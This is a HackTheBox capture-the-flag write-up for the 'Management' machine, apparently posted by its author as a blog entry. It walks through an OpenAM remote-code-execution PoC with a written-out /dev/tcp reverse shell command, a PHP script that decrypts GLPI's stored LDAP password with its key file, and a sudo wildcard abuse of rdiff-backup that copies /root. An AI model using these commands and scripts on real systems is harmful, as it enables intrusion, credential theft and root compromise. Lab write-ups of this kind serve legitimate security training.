---
title: Management HackTheBox Machine
date: 2026-11-02 12:00:00 +/-TTTT
tags: [hackthebox]     # TAG names should always be lowercase
author: stapat
---

# HTB Management - Write-up

> **Target:** `management.htb`\
> **Initial foothold:** OpenAM RCE → credentials decoding\
> **Privilege escalation:** sudo-authorized `rdiff-backup`

## 1. Nmap reconnaissance

Run a full TCP port scan:

``` bash
nmap -sC -sV -T4 management.htb
```

## 2. Initial access - OpenAM

The web attack surface included OpenAM. An OpenAM remote-code-execution
CVE-2026-33439 was used to obtain a low-privileged shell. The initial shell was reported as `openam`;.

[poc link](https://github.com/stapat1245/CVE-2026-33439_poc.git)


``` bash
python3 openam_check.py -url https://<TARGET>/openam/authservice -c "id"
python3 openam_check.py -url https://<TARGET>/openam/authservice -c "bash -c 'bash -i >& /dev/tcp/10.10.14.217/4444 0>&1'"
```

## 3. Lateral Movement

- Found GLPI under /opt/glpi.
- Read its database configuration from config_db.php and got the MariaDB connection details.
- Queried glpidb → glpi_authldaps, record id = 1.
- Retrieved the encrypted rootdn_passwd value.
- Found the GLPI key at /opt/glpi/config/glpicrypt.key (32 bytes and readable by our shell).
- Base64-decoded the password blob. Its first 24 bytes were the nonce; the remainder was ciphertext plus authentication tag.
- Decrypted it with sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(), using the nonce as both nonce and associated data.
- Used the recovered credential to access the owen account.


```bash
cd /opt/glpi
cat config/config_db.php
mysql -u glpidb -p 
```

```sql
SELECT id, name, rootdn, rootdn_passwd
FROM glpi_authldaps
WHERE id = 1; --get the rootdn_passwd
exit;
```
```bash
ls -l /opt/glpi/config/glpicrypt.key
cat > /tmp/decrypt.php <<'PHP'
<?php
$key = file_get_contents('/opt/glpi/config/glpicrypt.key');

$encoded = 'PASTE_ROOTDN_PASSWD_VALUE_HERE';

$raw = base64_decode($encoded, true);

if ($raw === false || strlen($raw) < 24) {
    die("Invalid encrypted value\n");
}

$nonce = substr($raw, 0, 24);
$ciphertext = substr($raw, 24);

$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(
    $ciphertext,
    $nonce,  // associated data
    $nonce,
    $key
);

if ($plaintext === false) {
    die("Decryption failed\n");
}

echo $plaintext, "\n";
PHP

php /tmp/decrypt.php
```


## 3. Local enumeration

After foothold, check identity, sudo permissions, and system
information:

``` bash
id
sudo -l
uname -a
```

PEASS/linpeas was also run.

## 4. Privelage Escalation

`sudo -l` result was:

``` text
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

This allowed the specified `rdiff-backup` server command to run as root
without a password. The trailing wildcard meant additional arguments
could be supplied, making the argument/restriction behavior worth
testing.

``` bash
rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/root_backup
```

It invokes the root server through the permitted sudo command and
supplies another `--restrict-path` argument. here, the result was
a backup copy of `/root` under `/tmp/root_backup`.

Inspect the result:

``` bash
ls -la /tmp/root_backup
```

``` bash
cat /tmp/root_backup/root.txt
```